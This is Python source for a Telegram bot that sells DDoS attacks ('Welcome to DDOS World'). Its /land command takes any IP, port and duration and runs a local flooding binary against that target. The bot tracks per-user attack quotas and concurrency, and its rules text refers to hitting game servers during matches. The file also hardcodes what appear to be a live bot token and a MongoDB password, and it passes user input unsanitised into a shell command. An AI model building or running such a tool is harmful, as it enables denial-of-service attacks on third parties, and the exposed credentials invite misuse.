import os
import signal
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread, Lock, Semaphore
import asyncio
import aiohttp
from telebot import types
import pytz
import psutil

# ==================== CONFIGURATION FROM ENVIRONMENT ====================
TOKEN = os.environ.get("8716122587:AAFElUlA1TCZb-2NkUTIc3x8it8FfvdDgSw")
MONGO_URI = os.environ.get("mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net")
if not TOKEN or not MONGO_URI:
    raise ValueError("BOT_TOKEN and MONGO_URI must be set in environment variables")

FORWARD_CHANNEL_ID = -1003476877991      # not actively used, keep as is
CHANNEL_ID = -1003476877991
error_channel_id = -1003476877991

TARGET_GROUP_ID = -1003561999359
GROUP_INVITE_LINK = "https://t.me/vipownerboss"

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# ==================== DATABASE ====================
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['land']
users_collection = db.users

# ==================== GLOBAL STATE ====================
# Limit concurrent attacks to 3
attack_semaphore = Semaphore(3)
# Track ongoing attacks per user: {user_id: (start_time, duration, chat_id, message_id)}
ongoing_attacks = {}
ongoing_lock = Lock()

# ==================== BOT SETUP ====================
bot = telebot.TeleBot(TOKEN)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ==================== ASYNCIO LOOP (runs in background thread) ====================
loop = asyncio.new_event_loop()

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
asyncio_thread.start()

# ==================== HELPER FUNCTIONS ====================
def is_target_group(message):
    return message.chat.id == TARGET_GROUP_ID

def get_or_create_user(user_id, username=None):
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        user = {
            "user_id": user_id,
            "username": username,
            "attack_count_since_verify": 0,
            "total_attacks": 0
        }
        users_collection.insert_one(user)
    return user

def update_user(user_id, update_data):
    users_collection.update_one({"user_id": user_id}, {"$set": update_data})

def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(text="🪀 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 🪀", url=GROUP_INVITE_LINK)
    button1 = types.InlineKeyboardButton(text="💔 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 💔", url="https://t.me/VIPXOWNER8")
    markup.add(button3, button1)
    return markup

# ==================== BACKGROUND ATTACK TASK ====================
async def run_attack_task(chat_id, message_id, user_id, target_ip, target_port, duration):
    """Coroutine that runs the attack, updates countdown, and cleans up."""
    try:
        # Record start in ongoing_attacks
        start_time = loop.time()
        with ongoing_lock:
            ongoing_attacks[user_id] = (start_time, duration, chat_id, message_id)

        # Launch the attack binary
        process = await asyncio.create_subprocess_shell(
            f"./ultra {target_ip} {target_port} {duration} 10"
        )

        # Countdown loop – update message every second
        for remaining in range(duration, 0, -1):
            await asyncio.sleep(1)
            elapsed = loop.time() - start_time
            remaining = max(0, duration - int(elapsed))
            new_text = (f"*🚀 Attack Initiated!*\n\n"
                        f"📡 Target: {target_ip}:{target_port}\n"
                        f"⏰ Duration: {remaining}s remaining\n"
                        f"🔥 Prepare for action!")

            # Edit message in a thread to avoid blocking the event loop
            try:
                await asyncio.to_thread(
                    bot.edit_message_text,
                    new_text,
                    chat_id=chat_id,
                    message_id=message_id,
                    reply_markup=create_inline_keyboard(),
                    parse_mode='Markdown'
                )
            except Exception as e:
                if "message is not modified" not in str(e):
                    logging.error(f"Edit error: {e}")

        # Wait for the process to finish (should be done by now)
        await process.wait()

        # Send completion message
        await asyncio.to_thread(
            bot.send_message,
            chat_id,
            "*✅ Attack Completed!*\nThank you for using our service!",
            reply_markup=create_inline_keyboard(),
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Attack task error: {e}")
    finally:
        # Release the attack slot
        attack_semaphore.release()
        # Remove from ongoing tracking
        with ongoing_lock:
            ongoing_attacks.pop(user_id, None)

# ==================== COMMAND HANDLERS ====================
@bot.message_handler(commands=['land'])
def handle_attack_command(message):
    if not is_target_group(message):
        bot.reply_to(message, f"❌ This bot only works in the designated group. Join here: {GROUP_INVITE_LINK}")
        return

    user_id = message.from_user.id
    chat_id = message.chat.id
    username = message.from_user.username

    # Check user's verification status
    user = get_or_create_user(user_id, username)
    attack_count = user.get("attack_count_since_verify", 0)
    if attack_count >= 2:
        bot.send_message(chat_id,
                         "*⚠️ Verification Required*\n\n"
                         "You have used your 2 attacks. Please send a **photo** in this group to verify and continue.\n"
                         "After sending a photo, you will be able to attack again.",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    # Parse arguments
    args = message.text.split()[1:]
    if len(args) != 3:
        bot.send_message(chat_id,
                         "*💣 Usage:* `/land <ip> <port> <duration>`\n"
                         "Example: `/land 192.168.1.1 80 60`",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

    if target_port in blocked_ports:
        bot.send_message(chat_id,
                         f"*🔒 Port {target_port} is blocked. Choose a different port.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    if duration > 300:
        bot.send_message(chat_id,
                         "*⏳ Maximum duration is 300 seconds.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    # Check if a concurrent slot is available
    if not attack_semaphore.acquire(blocking=False):
        bot.send_message(chat_id,
                         "*⚠️ Maximum 3 attacks are running concurrently. Please wait for a slot to free up.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    # Send initial message
    sent_msg = bot.send_message(chat_id,
                                f"*🚀 Attack Initiated!*\n\n"
                                f"📡 Target: {target_ip}:{target_port}\n"
                                f"⏰ Duration: {duration}s\n"
                                f"🔥 Prepare for action!",
                                reply_markup=create_inline_keyboard(), parse_mode='Markdown')

    # Update user stats immediately
    new_count = attack_count + 1
    update_user(user_id, {
        "attack_count_since_verify": new_count,
        "total_attacks": user.get("total_attacks", 0) + 1
    })

    # Launch background attack task
    asyncio.run_coroutine_threadsafe(
        run_attack_task(chat_id, sent_msg.message_id, user_id, target_ip, target_port, duration),
        loop
    )

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if not is_target_group(message):
        return
    user_id = message.from_user.id
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        return

    attack_count = user.get("attack_count_since_verify", 0)
    if attack_count >= 2:
        update_user(user_id, {"attack_count_since_verify": 0})
        bot.reply_to(message,
                     "*✅ Verification Successful!*\nYou can now use `/land` again.",
                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    else:
        bot.reply_to(message,
                     f"*ℹ️ You don't need verification yet.*\nCurrent attacks since last verify: {attack_count}/2",
                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['when'])
def when_command(message):
    if not is_target_group(message):
        return
    user_id = message.from_user.id
    with ongoing_lock:
        attack_info = ongoing_attacks.get(user_id)
    if attack_info:
        start_time, duration, _, _ = attack_info
        elapsed = time.time() - start_time
        remaining = max(0, duration - int(elapsed))
        bot.send_message(message.chat.id,
                         f"*⏳ Time Remaining: {remaining} seconds*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id,
                         "*❌ No attack in progress*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    if not is_target_group(message):
        return
    user_id = message.from_user.id
    user = users_collection.find_one({"user_id": user_id})
    username = message.from_user.username or "Unknown"

    if not user:
        bot.send_message(message.chat.id,
                         "*⚠️ You have not used any attacks yet.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    attack_count = user.get("attack_count_since_verify", 0)
    total = user.get("total_attacks", 0)
    remaining = max(0, 2 - attack_count)

    response = (f"*👤 Username:* @{username}\n"
                f"*📊 Attacks since last verify:* {attack_count}/2\n"
                f"*🔓 Attacks remaining before verify:* {remaining}\n"
                f"*📈 Total attacks:* {total}\n"
                f"*🎯 Keep attacking and verify with a photo when needed!*")
    bot.send_message(message.chat.id, response,
                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['rules'])
def rules_command(message):
    if not is_target_group(message):
        return
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 Avoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 Using hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 Keep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ Message Owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!*"
    )
    bot.send_message(message.chat.id, rules_text,
                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    if not is_target_group(message):
        return
    help_text = ("*🌟 Available Commands*\n\n"
                 "⚔️ `/land <ip> <port> <duration>` – Launch an attack\n"
                 "👤 `/myinfo` – Your attack stats\n"
                 "⏳ `/when` – Time left in current attack\n"
                 "📞 `/owner` – Contact owner\n"
                 "🦅 `/canary` – Download HttpCanary\n"
                 "📜 `/rules` – Server rules\n\n"
                 "After **2 attacks**, you must send a **photo** in the group to verify and continue.")
    bot.send_message(message.chat.id, help_text,
                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['owner'])
def owner_command(message):
    if not is_target_group(message):
        return
    response = ("*👤 Owner Information*\n\n"
                "📩 **Telegram:** @VIPXOWNER8\n"
                "💬 Feel free to reach out for support or inquiries.")
    bot.send_message(message.chat.id, response,
                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['canary'])
def canary_command(message):
    if not is_target_group(message):
        return
    response = ("*📥 Download HttpCanary*\n\n"
                "📱 [Android Download](https://t.me/c/3661090730/1557)\n"
                "🍎 [iOS Download (Surge 5)](https://apps.apple.com/in/app/surge-5/id1442620678)")
    bot.send_message(message.chat.id, response,
                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    if not is_target_group(message):
        bot.reply_to(message, f"❌ This bot works only in the group. Join here: {GROUP_INVITE_LINK}")
        return
    bot.send_message(message.chat.id,
                     "*🌍 Welcome to DDOS World!*\nUse `/land` to begin. Check `/help` for all commands.",
                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')

# ==================== START BOT ====================
if __name__ == "__main__":
    logging.info("Bot started. Waiting for messages...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(5)